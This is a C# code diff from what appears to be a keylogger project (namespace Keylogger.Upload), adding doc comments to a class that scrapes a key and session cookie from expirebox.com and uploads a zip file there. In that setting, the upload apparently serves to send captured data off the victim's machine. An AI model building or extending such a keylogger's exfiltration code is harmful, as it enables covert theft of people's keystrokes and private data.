@@ -10,11 +10,19 @@ using System.Threading.Tasks;
 
 namespace Keylogger.Upload
 {
+    /// <summary>
+    /// Represent expirebox.com online storage
+    /// </summary>
     public class ExpireBox : IOnlineService
     {
+        /// <summary>
+        /// This function should upload given zip file onto online storage and return link for file download
+        /// </summary>
+        /// <param name="zipFile">Path to the zip file to upload</param>
+        /// <returns>Url where the zip file can be downloaded</returns>
         public string Upload(string zipFile)
         {
-            // Download key
+            // Download u_key and session aka browser
             string key = null;
             string sessionCookie = null;
             using (WebClient wc = new WebClient())
@@ -33,7 +41,7 @@ namespace Keylogger.Upload
                 // Get the key
                 key = dom["[name='u_key']"].Single().Value;
 
-                // Get session id
+                // Get session cookie
                 string cookies = wc.ResponseHeaders[HttpResponseHeader.SetCookie];
                 sessionCookie = cookies.Substring(0, cookies.IndexOf(';'));
             }
@@ -41,6 +49,7 @@ namespace Keylogger.Upload
             // Upload the file
             using (WebClient wc = new WebClient())
             {
+                // Boundary for multipart/form-data request
                 string boundary = "-----------------------------93391194027355";
 
                 // Prepare client
